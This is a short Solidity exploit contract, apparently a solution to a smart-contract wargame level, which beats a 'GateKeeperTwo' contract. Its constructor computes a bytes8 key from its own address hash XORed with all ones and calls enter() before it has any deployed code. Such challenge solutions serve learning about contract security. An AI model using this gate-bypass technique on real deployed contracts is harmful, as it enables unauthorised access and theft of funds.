// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateKeeperTwoAttack {
    event Response(uint x);

    constructor(address _contract) public {
        bytes8 payload = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        (bool result, ) = _contract.call(abi.encodeWithSignature("enter(bytes8)", payload));
        if (result) {
            emit Response(1111);
        } else {
            emit Response(2222);
        }
    }
}